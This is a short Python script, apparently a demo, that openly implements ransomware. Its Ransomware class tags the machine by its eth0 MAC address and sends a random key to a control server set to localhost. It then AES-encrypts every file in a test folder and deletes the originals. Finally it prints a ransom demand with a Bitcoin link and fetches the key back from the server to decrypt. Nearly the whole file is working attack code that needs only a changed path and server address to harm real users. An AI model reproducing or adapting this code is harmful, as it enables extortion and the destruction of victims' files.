import pyAesCrypt
import pathlib
import os
import secrets
import getmac
import requests


def get_device_id():
    eth_mac = getmac.get_mac_address(interface="eth0")
    return eth_mac


def fetch_files_in_dir(path):
    return list(pathlib.Path(path).glob('*'))


class Ransomware():
    """Base ransomware class"""

    def __init__(self) -> None:
        self.dir = './ransomware_test'
        self.files_list = fetch_files_in_dir(self.dir)
        self.server_url = 'http://127.0.0.1:5000/'
        self.device_id = get_device_id()

    def generate_key(self):
        hash = secrets.token_hex(nbytes=128)
        return hash

    def encrypt(self):
        password = self.generate_key()
        server_url = self.server_url
        data = {
            'device_id': self.device_id,
            'encryption_key': password
        }
        requests.post(server_url, json=data)
        for item in self.files_list:
            pyAesCrypt.encryptFile("./{}".format(item),
                                   "./{}.aes".format(item), password)
            os.remove('./{}'.format(item))
        return password

    def decrypt(self):
        updated_files_list = fetch_files_in_dir(self.dir)
        data = {
            'device_id': self.device_id
        }
        response = requests.get(self.server_url, json=data)
        password = response.json().get('password')
        for item in updated_files_list:
            pyAesCrypt.decryptFile(
                "./{}".format(item), "./{}".format(item).replace('.aes', ''), password)
            os.remove('./{}'.format(item))
        return 


object = Ransomware()
dkey = object.encrypt()
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("Your System has been comprmised and all your files has been encryted")
print("Make the payment using below link")
print("https://bitcoin.org/en/")
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("Decryption key is {}".format(dkey))
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("####################################################################")
decryption_key = input("Enter the decryption key to continue ")
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("####################################################################")
print("####################################################################")

object.decrypt()